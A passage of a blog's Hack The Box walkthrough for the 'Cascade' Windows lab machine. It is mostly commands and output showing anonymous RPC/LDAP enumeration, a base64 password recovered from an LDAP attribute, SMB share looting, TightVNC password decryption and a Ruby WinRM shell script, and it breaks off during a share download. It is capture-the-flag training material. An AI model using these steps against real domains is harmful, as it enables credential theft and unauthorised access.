@@ -1,0 +1,991 @@
+<!DOCTYPE html>
+<html lang="">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Cache-Control" content="public" />
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.55.6" />
+
+    
+    
+    
+
+<title>Hack The Box - Cascade • Haax - Personal Blog</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Hack The Box - Cascade"/>
+<meta name="twitter:description" content="Cascade is a Windows machine considered easy/medium. An anonymous RPC access allows domain users enumeration and an anonymous search through LDAP allows to get a password using one account attribute. Then, the enumeration of SMB shares and available files reveals a VNC configuration file, giving another password once decrypted. The target account is used as a service and it is possible to get the binary. A fast reverse engineering gives the password through decryption function. Privilege escalation is done using a particular account that is supposed to be deleted."/>
+
+<meta property="og:title" content="Hack The Box - Cascade" />
+<meta property="og:description" content="Cascade is a Windows machine considered easy/medium. An anonymous RPC access allows domain users enumeration and an anonymous search through LDAP allows to get a password using one account attribute. Then, the enumeration of SMB shares and available files reveals a VNC configuration file, giving another password once decrypted. The target account is used as a service and it is possible to get the binary. A fast reverse engineering gives the password through decryption function. Privilege escalation is done using a particular account that is supposed to be deleted." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://haax9.github.io/en/walkthroughs/hackthebox/cascade/" />
+<meta property="og:site_name" content="Haax - Personal Blog" />
+
+
+    
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">
+
+
+
+
+<link rel="stylesheet" href="/css/hyde-hyde.css">
+<link rel="stylesheet" href="/css/custom.css">
+<link rel="stylesheet" href="/css/print.min.css" media="print">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+
+</head>
+
+
+    <body >
+        
+<div class="sidebar">
+  <div class="container ">
+    <div class="sidebar-about">
+      
+      
+          <a href="https://haax9.github.io/en">
+          
+          
+          
+          <div class="author-image">
+            <img src="/img/icons/haax_logo.png" alt="Author Image" class="img--circle img--headshot element--center">
+          </div>
+          
+          </a>
+        
+      <p class="site__description">
+        <a href="https://haax9.github.io">
+         Infosec articles &amp; CTF Writeups 
+      </a>
+      </p>
+    </div>
+    <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/en/articles/">
+						<span>Articles</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/en/walkthroughs/">
+						<span>Walkthroughs</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/en/writeups/">
+						<span>Write-Ups</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/en/about/">
+						<span>About</span>
+					</a>
+				</li>
+			 
+		
+		</li>
+		<li>
+			<a href="https://cheatsheet.haax.fr" target="_blank">Cheasheet</a>
+		</li>
+	</ul>
+</div>
+
+    <p>
+      <section class="social">
+	
+	<a href="https://twitter.com/Haax9_" target="blank"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+	
+	
+	&nbsp;<a href="https://github.com/Haax9" target="blank"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	&nbsp;<a href="https://gitlab.com/Haax" target="blank"><i class="fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+  &nbsp;<a href="https://www.root-me.org/Haax" target="blank" class="linklogo"><div class="rootme_logo logohover"></div></a>
+  
+	
+  &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="aperikube_logo logohover"></div></a>
+  
+	
+	&nbsp;<a href="mailto:haax@mdamail.ch" target="blank"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	&nbsp;<a href="https://haaxmax.github.io/en/index.xml" target="blank"><i class="fas fa-rss fa-lg" aria-hidden="true"></i></a>
+	</section>
+
+    </p>
+    <div class="langSection">
+      
+      
+      <a rel="alternate" href="/fr/walkthroughs/hackthebox/cascade/" hreflang="fr" lang="fr" class="langLink">Français</a>
+      <a rel="alternate" href="/fr/walkthroughs/hackthebox/cascade/" hreflang="fr" lang="fr"><img src="/img/icons/logo_drapeau_france.png" alt="logo_fracne" class="logoFlag"/></a>
+      </div>
+    <p class="copyright">
+      &copy; 2020 Haax.
+      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
+      <br/>Built with
+      <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+      
+    </p>
+  </div>
+  <div>
+  </div>
+</div>
+
+        <div class="content container">
+            
+    <article>
+  <header>
+    <h1>Hack The Box - Cascade</h1>
+    
+    
+<div class="post__meta">
+    
+    
+    
+    
+    
+    <br/>
+    <i class="fas fa-clock"></i> 16 min read
+</div>
+
+
+  </header>
+  <div class="post">
+    <p>Cascade is a Windows machine considered easy/medium. An anonymous RPC access allows domain users enumeration and an anonymous search through LDAP allows to get a password using one account attribute. Then, the enumeration of SMB shares and available files reveals a VNC configuration file, giving another password once decrypted. The target account is used as a service and it is possible to get the binary. A fast reverse engineering gives the password through decryption function. Privilege escalation is done using a particular account that is supposed to be deleted.</p>
+
+<p><strong>Disclaimer :</strong> It is a rather quick presentation that deliberately omits the various research areas. Only the actual results and a quick approach are presented. Furthermore, I didn&rsquo;t have lot of time to write and translate this write-up, so I used deepl.com translator for some parts ! I&rsquo;m sorry if the english is not that good ! :)</p>
+
+<h2 id="discovery-enumeration">Discovery / Enumeration</h2>
+
+<p>A quick port scan gives us running services on the machine</p>
+
+<pre><code class="language-bash">$ sudo nmap -sS -p 0-10000 -T4 -sV -sC default -O -v -oN scan_nmap 10.10.10.182 
+
+Nmap scan report for 10.10.10.182
+Host is up (0.13s latency).
+Not shown: 9991 filtered ports
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-11 12:42:51Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8.1 (90%), Microsoft Windows 7 (90%)
+No exact OS matches for host (test conditions non-ideal).
+Uptime guess: 0.009 days (since Sat Apr 11 14:31:28 2020)
+TCP Sequence Prediction: Difficulty=251 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1m27s, deviation: 0s, median: 1m27s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2020-04-11 14:43:15
+|_  start_date: 2020-04-11 14:33:30
+
+NSE: Script Post-scanning.
+Initiating NSE at 14:43
+Completed NSE at 14:43, 0.00s elapsed
+Initiating NSE at 14:43
+Completed NSE at 14:43, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 541.01 seconds
+           Raw packets sent: 30274 (1.336MB) | Rcvd: 242 (11.308KB)
+</code></pre>
+
+<p>Classic Windows machine ports are open. No exotic ones
+<br/></p>
+
+<h3 id="anonymous-bind-first-access">Anonymous bind &amp; first access</h3>
+
+<p>First, we can try to log to RPC using anonymous bind and enumerate domain users.</p>
+
+<pre><code class="language-bash">$ rpcclient -U &quot;&quot; 10.10.10.182
+Enter WORKGROUP\'s password: 
+rpcclient $&gt; enumdomusers
+user:[CascGuest] rid:[0x1f5]
+user:[arksvc] rid:[0x452]
+user:[s.smith] rid:[0x453]
+user:[r.thompson] rid:[0x455]
+user:[util] rid:[0x457]
+user:[j.wakefield] rid:[0x45c]
+user:[s.hickson] rid:[0x461]
+user:[j.goodhand] rid:[0x462]
+user:[a.turnbull] rid:[0x464]
+user:[e.crowe] rid:[0x467]
+user:[b.hanson] rid:[0x468]
+user:[d.burman] rid:[0x469]
+user:[BackupSvc] rid:[0x46a]
+user:[j.allen] rid:[0x46e]
+user:[i.croft] rid:[0x46f]
+</code></pre>
+
+<p>It works, so can automate the extraction of information using <code>enum4linux</code>. The output below is truncated to keep only some interesting parts. Since enumeration is one of the key phases in this type of exercise, we want to know users, groups and the relationships between them.</p>
+
+<pre><code class="language-bash">$ enum4linux 10.10.10.182
+
+...
+
+[+] Getting builtin group memberships:
+Group 'Users' (RID: 545) has member: NT AUTHORITY\INTERACTIVE
+Group 'Users' (RID: 545) has member: NT AUTHORITY\Authenticated Users
+Group 'Users' (RID: 545) has member: CASCADE\Domain Users
+Group 'Guests' (RID: 546) has member: CASCADE\CascGuest
+Group 'Guests' (RID: 546) has member: CASCADE\Domain Guests
+Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: NT AUTHORITY\Authenticated Users
+Group 'Windows Authorization Access Group' (RID: 560) has member: NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
+
+[+] Getting local groups:
+group:[Cert Publishers] rid:[0x205]
+group:[RAS and IAS Servers] rid:[0x229]
+group:[Allowed RODC Password Replication Group] rid:[0x23b]
+group:[Denied RODC Password Replication Group] rid:[0x23c]
+group:[DnsAdmins] rid:[0x44e]
+group:[IT] rid:[0x459]
+group:[Production] rid:[0x45a]
+group:[HR] rid:[0x45b]
+group:[AD Recycle Bin] rid:[0x45f]
+group:[Backup] rid:[0x460]
+group:[Temps] rid:[0x463]
+group:[WinRMRemoteWMIUsers__] rid:[0x465]
+group:[Remote Management Users] rid:[0x466]
+group:[Factory] rid:[0x46c]
+group:[Finance] rid:[0x46d]
+group:[Audit Share] rid:[0x471]
+group:[Data Share] rid:[0x472]
+
+[+] Getting local group memberships:
+Group 'IT' (RID: 1113) has member: CASCADE\arksvc
+Group 'IT' (RID: 1113) has member: CASCADE\s.smith
+Group 'IT' (RID: 1113) has member: CASCADE\r.thompson
+Group 'HR' (RID: 1115) has member: CASCADE\s.hickson
+Group 'Data Share' (RID: 1138) has member: CASCADE\Domain Users
+Group 'Audit Share' (RID: 1137) has member: CASCADE\s.smith
+Group 'Remote Management Users' (RID: 1126) has member: CASCADE\arksvc
+Group 'Remote Management Users' (RID: 1126) has member: CASCADE\s.smith
+Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\krbtgt
+Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Domain Controllers
+Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Schema Admins
+Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Enterprise Admins
+Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Cert Publishers
+Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Domain Admins
+Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Group Policy Creator Owners
+Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Read-only Domain Controllers
+Group 'AD Recycle Bin' (RID: 1119) has member: CASCADE\arksvc
+
+[+] Getting domain groups:
+group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+group:[Domain Users] rid:[0x201]
+group:[Domain Guests] rid:[0x202]
+group:[Domain Computers] rid:[0x203]
+group:[Group Policy Creator Owners] rid:[0x208]
+group:[DnsUpdateProxy] rid:[0x44f]
+
+[+] Getting domain group memberships:
+Group 'Domain Users' (RID: 513) has member: CASCADE\administrator
+Group 'Domain Users' (RID: 513) has member: CASCADE\krbtgt
+Group 'Domain Users' (RID: 513) has member: CASCADE\arksvc
+Group 'Domain Users' (RID: 513) has member: CASCADE\s.smith
+Group 'Domain Users' (RID: 513) has member: CASCADE\r.thompson
+Group 'Domain Users' (RID: 513) has member: CASCADE\util
+Group 'Domain Users' (RID: 513) has member: CASCADE\j.wakefield
+Group 'Domain Users' (RID: 513) has member: CASCADE\s.hickson
+Group 'Domain Users' (RID: 513) has member: CASCADE\j.goodhand
+Group 'Domain Users' (RID: 513) has member: CASCADE\a.turnbull
+Group 'Domain Users' (RID: 513) has member: CASCADE\e.crowe
+Group 'Domain Users' (RID: 513) has member: CASCADE\b.hanson
+Group 'Domain Users' (RID: 513) has member: CASCADE\d.burman
+Group 'Domain Users' (RID: 513) has member: CASCADE\BackupSvc
+Group 'Domain Users' (RID: 513) has member: CASCADE\j.allen
+Group 'Domain Users' (RID: 513) has member: CASCADE\i.croft
+Group 'Group Policy Creator Owners' (RID: 520) has member: CASCADE\administrator
+Group 'Domain Guests' (RID: 514) has member: CASCADE\CascGuest
+
+...
+</code></pre>
+
+<p>We can also try enumeration through LDAP. Using this method, we can get more information such as some objects attributes.</p>
+
+<pre><code class="language-bash">$ ldapsearch -x -h 10.10.10.182 -D '' -w '' -b &quot;DC=CASCADE,DC=LOCAL&quot;
+# extended LDIF
+#
+# LDAPv3
+# base &lt;DC=CASCADE,DC=LOCAL&gt; with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# cascade.local
+dn: DC=cascade,DC=local
+objectClass: top
+objectClass: domain
+objectClass: domainDNS
+distinguishedName: DC=cascade,DC=local
+instanceType: 5
+whenCreated: 20200109153132.0Z
+whenChanged: 20200411123320.0Z
+subRefs: DC=ForestDnsZones,DC=cascade,DC=local
+subRefs: DC=DomainDnsZones,DC=cascade,DC=local
+subRefs: CN=Configuration,DC=cascade,DC=local
+uSNCreated: 4099
+uSNChanged: 319567
+name: cascade
+objectGUID:: BEPTb7rgSEuSvojkxZJmOA==
+creationTime: 132310820004120279
+forceLogoff: -9223372036854775808
+lockoutDuration: -18000000000
+lockOutObservationWindow: -18000000000
+lockoutThreshold: 0
+maxPwdAge: -9223372036854775808
+minPwdAge: 0
+minPwdLength: 5
+modifiedCountAtLastProm: 0
+nextRid: 1001
+pwdProperties: 0
+pwdHistoryLength: 0
+objectSid:: AQQAAAAAAAUVAAAAMvuhxgsd8Uf1yHJF
+serverState: 1
+uASCompat: 1
+modifiedCount: 1
+auditingPolicy:: AAE=
+nTMixedDomain: 0
+...
+</code></pre>
+
+<p>Interesting thing here is about <code>r.thompson</code>. Indeed, this one have a strange attribute called <code>cascadeLegacyPwd</code>.</p>
+
+<pre><code class="language-bash"># Ryan Thompson, Users, UK, cascade.local
+dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Ryan Thompson
+sn: Thompson
+givenName: Ryan
+distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
+instanceType: 4
+whenCreated: 20200109193126.0Z
+whenChanged: 20200323112031.0Z
+displayName: Ryan Thompson
+uSNCreated: 24610
+memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
+uSNChanged: 295010
+name: Ryan Thompson
+objectGUID:: LfpD6qngUkupEy9bFXBBjA==
+userAccountControl: 66048
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 132247339091081169
+lastLogoff: 0
+lastLogon: 132247339125713230
+pwdLastSet: 132230718862636251
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
+accountExpires: 9223372036854775807
+logonCount: 2
+sAMAccountName: r.thompson
+sAMAccountType: 805306368
+userPrincipalName: r.thompson@cascade.local
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
+dSCorePropagationData: 20200126183918.0Z
+dSCorePropagationData: 20200119174753.0Z
+dSCorePropagationData: 20200119174719.0Z
+dSCorePropagationData: 20200119174508.0Z
+dSCorePropagationData: 16010101000000.0Z
+lastLogonTimestamp: 132294360317419816
+msDS-SupportedEncryptionTypes: 0
+cascadeLegacyPwd: clk0bjVldmE=
+</code></pre>
+
+<p>The string seems to be base64 encoded. Once decoded, we grab the first password !</p>
+
+<pre><code class="language-bash">$ echo &quot;clk0bjVldmE=&quot; | base64 -d
+rY4n5eva%
+</code></pre>
+
+<p><br/></p>
+
+<h3 id="smb-shares-first-escalation">SMB Shares &amp; first escalation</h3>
+
+<p>Now that we have a first domain access, we can look at SMB shares.
+Let&rsquo;s start by listing them.</p>
+
+<pre><code class="language-bash">$ smbclient -U &quot;r.thompson&quot; -L //10.10.10.182                 
+Enter WORKGROUP\r.thompson's password: 
+
+  Sharename       Type      Comment
+  ---------       ----      -------
+  ADMIN$          Disk      Remote Admin
+  Audit$          Disk      
+  C$              Disk      Default share
+  Data            Disk      
+  IPC$            IPC       Remote IPC
+  NETLOGON        Disk      Logon server share 
+  print$          Disk      Printer Drivers
+  SYSVOL          Disk      Logon server share 
+SMB1 disabled -- no workgroup available
+</code></pre>
+
+<p>In addition to the classic shares, we can notice the presence of <code>Data</code> and <code>Audit$</code>. It turns out that the <code>Audit$</code> share is not available at the moment.</p>
+
+<pre><code class="language-bash">$ smbclient -U &quot;r.thompson&quot; //10.10.10.182/Audit$
+Enter WORKGROUP\r.thompson's password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+NT_STATUS_ACCESS_DENIED listing \*
+</code></pre>
+
+<p>For <code>Data</code>, we can connect and browse it.</p>
+
+<pre><code class="language-bash">$ smbclient -U &quot;r.thompson&quot; //10.10.10.182/Data
+Enter WORKGROUP\r.thompson's password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Mon Jan 27 04:27:34 2020
+  ..                                  D        0  Mon Jan 27 04:27:34 2020
+  Contractors                         D        0  Mon Jan 13 02:45:11 2020
+  Finance                             D        0  Mon Jan 13 02:45:06 2020
+  IT                                  D        0  Tue Jan 28 19:04:51 2020
+  Production                          D        0  Mon Jan 13 02:45:18 2020
+  Temps                               D        0  Mon Jan 13 02:45:15 2020
+
+    13106687 blocks of size 4096. 7794590 blocks available
+</code></pre>
+
+<p>Few elements are available. We can only gather 4 files.</p>
+
+<pre><code class="language-bash">smb: \IT\Logs\Ark AD Recycle Bin\&gt; get ArkAdRecycleBin.log 
+getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as ArkAdRecycleBin.log (3.1 KiloBytes/sec) (average 7.9 KiloBytes/sec)
+
+smb: \IT\Logs\DCs\&gt; get dcdiag.log 
+getting file \IT\Logs\DCs\dcdiag.log of size 5967 as dcdiag.log (14.1 KiloBytes/sec) (average 10.2 KiloBytes/sec)
+
+smb: \IT\Temp\s.smith\&gt; get &quot;VNC Install.reg&quot;
+getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as VNC Install.reg (6.3 KiloBytes/sec) (average 6.3 KiloBytes/sec)
+
+smb: \IT\Email Archives\&gt; get Meeting_Notes_June_2018.html 
+getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as Meeting_Notes_June_2018.html (6.0 KiloBytes/sec) (average 7.4 KiloBytes/sec)
+</code></pre>
+
+<p>The <code>Meeting_Notes_June_2018.html</code> file gives a crucial information, the presence of a temporary account, having the same password as the administrator and having been deleted some time ago.</p>
+
+<pre><code class="language-bash">From: Steve Smith
+To: IT (Internal)
+Sent: 14 June 2018 14:07
+Subject: Meeting Notes
+
+For anyone that missed yesterday’s meeting (I’m looking at you Ben). Main points are below:
+
+-- New production network will be going live on Wednesday so keep an eye out for any issues.
+-- We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password).
+-- The winner of the “Best GPO” competition will be announced on Friday so get your submissions in soon.
+
+Steve
+</code></pre>
+
+<p>The <code>ArkAdRecycleBin.log</code> file shows that the <code>ArkSvc</code> account is used to manage the <code>Recycle Bin</code>. Logs also show that the <code>Test</code> and <code>TempAdmin</code> accounts have been removed, or at least moved.</p>
+
+<pre><code class="language-bash">$ cat FILES/ArkAdRecycleBin.log 
+1/10/2018 15:43 [MAIN_THREAD] ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
+1/10/2018 15:43 [MAIN_THREAD] Validating settings...
+1/10/2018 15:43 [MAIN_THREAD] Error: Access is denied
+1/10/2018 15:43 [MAIN_THREAD] Exiting with error code 5
+2/10/2018 15:56 [MAIN_THREAD] ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
+2/10/2018 15:56 [MAIN_THREAD] Validating settings...
+2/10/2018 15:56 [MAIN_THREAD] Running as user CASCADE\ArkSvc
+2/10/2018 15:56 [MAIN_THREAD] Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
+2/10/2018 15:56 [MAIN_THREAD] Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
+2/10/2018 15:56 [MAIN_THREAD] Exiting with error code 0 
+8/12/2018 12:22 [MAIN_THREAD] ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
+8/12/2018 12:22 [MAIN_THREAD] Validating settings...
+8/12/2018 12:22 [MAIN_THREAD] Running as user CASCADE\ArkSvc
+8/12/2018 12:22 [MAIN_THREAD] Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
+8/12/2018 12:22 [MAIN_THREAD] Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+8/12/2018 12:22 [MAIN_THREAD] Exiting with error code 0
+</code></pre>
+
+<p>The <code>VNC Install.reg</code> file is also very interesting since it is a VNC configuration file. It allows to recover a password, encrypted (&ldquo;Password&rdquo;=hex:6b,cf,2a,4b,6e,5a,ca,0f).</p>
+
+<pre><code class="language-bash">$ cat VNC\ Install.reg 
+��Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
+&quot;ExtraPorts&quot;=&quot;&quot;
+&quot;QueryTimeout&quot;=dword:0000001e
+&quot;QueryAcceptOnTimeout&quot;=dword:00000000
+&quot;LocalInputPriorityTimeout&quot;=dword:00000003
+&quot;LocalInputPriority&quot;=dword:00000000
+&quot;BlockRemoteInput&quot;=dword:00000000
+&quot;BlockLocalInput&quot;=dword:00000000
+&quot;IpAccessControl&quot;=&quot;&quot;
+&quot;RfbPort&quot;=dword:0000170c
+&quot;HttpPort&quot;=dword:000016a8
+&quot;DisconnectAction&quot;=dword:00000000
+&quot;AcceptRfbConnections&quot;=dword:00000001
+&quot;UseVncAuthentication&quot;=dword:00000001
+&quot;UseControlAuthentication&quot;=dword:00000000
+&quot;RepeatControlAuthentication&quot;=dword:00000000
+&quot;LoopbackOnly&quot;=dword:00000000
+&quot;AcceptHttpConnections&quot;=dword:00000001
+&quot;LogLevel&quot;=dword:00000000
+&quot;EnableFileTransfers&quot;=dword:00000001
+&quot;RemoveWallpaper&quot;=dword:00000001
+&quot;UseD3D&quot;=dword:00000001
+&quot;UseMirrorDriver&quot;=dword:00000001
+&quot;EnableUrlParams&quot;=dword:00000001
+&quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f
+&quot;AlwaysShared&quot;=dword:00000000
+&quot;NeverShared&quot;=dword:00000000
+&quot;DisconnectClients&quot;=dword:00000001
+&quot;PollingInterval&quot;=dword:000003e8
+&quot;AllowLoopback&quot;=dword:00000000
+&quot;VideoRecognitionInterval&quot;=dword:00000bb8
+&quot;GrabTransparentWindows&quot;=dword:00000001
+&quot;SaveLogToAllUsersPath&quot;=dword:00000000
+&quot;RunControlInterface&quot;=dword:00000001
+&quot;IdleTimeout&quot;=dword:00000000
+&quot;VideoClasses&quot;=&quot;&quot;
+&quot;VideoRects&quot;=&quot;&quot;
+</code></pre>
+
+<p>However, the passwords used by VNC are known to be weak. It is possible to decrypt them using different tools.
+For this machine, I used a small Windows utility called <code>vncpwd.exe</code>.</p>
+
+<pre><code class="language-bash">C:\vncpwd&gt;vncpwd.exe 6bcf2a4b6e5aca0f
+
+*VNC password decoder 0.2.1
+by Luigi Auriemma
+e-mail: aluigi@autistici.org
+web:    aluigi.org
+
+- your input password seems in hex format (or longer than 8 chars)
+
+  Password:   sT333ve2
+
+  Press RETURN to exit
+</code></pre>
+
+<p>A second password ! Given this and the names of the users, it is likely to be <code>s.smith</code>. Now it gets interesting! Remember, during enumeration, we saw that <code>s.smith</code> and <code>arksvc</code> are member of the <code>Remote Management Users</code> group. It means that they enough privilege to connect remotely using WinRM!</p>
+
+<p>So we get back our little ruby script, and then&hellip;</p>
+
+<pre><code class="language-bash">require 'winrm'
+
+conn = WinRM::Connection.new( 
+  endpoint: 'http://10.10.10.182:5985/wsman',
+  user: 'CASCADE.LOCAL\s.smith',
+  password: 'sT333ve2',
+)
+
+command=&quot;&quot;
+
+conn.shell(:powershell) do |shell|
+    until command == &quot;exit\n&quot; do
+        print &quot;PS &gt; &quot;
+        command = gets        
+        output = shell.run(command) do |stdout, stderr|
+            STDOUT.print stdout
+            STDERR.print stderr
+        end
+    end    
+    puts &quot;Exiting with code #{output.exitcode}&quot;
+end
+
+</code></pre>
+
+<p>A sweet user shell! =)</p>
+
+<pre><code class="language-bash">$ ruby winrm_shell_s.smith.rb 
+PS &gt; whoami
+cascade\s.smith
+PS &gt; pwd
+
+Path                      
+----                      
+C:\Users\s.smith\Documents
+
+
+PS &gt; type ../Desktop/user.txt
+a0**REDACTED**
+</code></pre>
+
+<p><br/></p>
+
+<h3 id="audit-share-reversing-new-account">Audit$ share, reversing &amp; new account</h3>
+
+<p>Having a new and more privilegied account, the <code>Audit$</code> SMB becomes available.</p>
+
+<pre><code class="language-bash">$ smbclient -U &quot;s.smith&quot; //10.10.10.182/Audit$
+Enter WORKGROUP\s.smith's password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Wed Jan 29 19:01:26 2020
+  ..                                  D        0  Wed Jan 29 19:01:26 2020
+  CascAudit.exe                       A    13312  Tue Jan 28 22:46:51 2020
+  CascCrypto.dll                      A    12288  Wed Jan 29 19:00:20 2020
+  DB                                  D        0  Tue Jan 28 22:40:59 2020
+  RunAudit.bat                        A       45  Wed Jan 29 00:29:47 2020
+  System.Data.SQLite.dll              A   363520  Sun Oct 27 07:38:36 2019
+  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 07:38:38 2019
+  x64                                 D        0  Sun Jan 26 23:25:27 2020
+  x86                                 D        0  Sun Jan 26 23:25:27 2020
+
+    13106687 blocks of size 4096. 7794393 blocks available
+</code></pre>
+
+<p>Several interesting elements there. Let&rsquo;s dump the entire share</p>
+
+<pre><code class="language-bash">smb: \&gt; mask &quot;&quot;
+smb: \&gt; recurse ON
+smb: \&gt; mget *
+Get file CascAudit.exe? y
+getting file \CascAudit.exe of size 13312 as CascAudit.exe (25.3 KiloBytes/sec) (average 25.3 KiloBytes/sec)
+Get file CascCrypto.dll? y
+getting file \CascCrypto.dll of size 12288 as CascCrypto.dll (28.4 KiloBytes/sec) (average 26.7 KiloBytes/sec)
+Get directory DB? y
+Get file Audit.db? y
+getting file \DB\Audit.db of size 24576 as Audit.db (56.7 KiloBytes/sec) (average 36.1 KiloBytes/sec)
+Get file RunAudit.bat? y
+getting file \RunAudit.bat of size 45 as RunAudit.bat (0.1 KiloBytes/sec) (average 27.8 KiloBytes/sec)
+Get file System.Data.SQLite.dll? y
+getting file \System.Data.SQLite.dll of size 363520 as System.Data.SQLite.dll (318.1 KiloBytes/sec) (average 140.2 KiloBytes/sec)
+Get file System.Data.SQLite.EF6.dll? y
+getting file \System.Data.SQLite.EF6.dll of size 186880 as System.Data.SQLite.EF6.dll (105.7 KiloBytes/sec) (average 127.3 KiloBytes/sec)
+Get directory x64? y
+Get file SQLite.Interop.dll? y
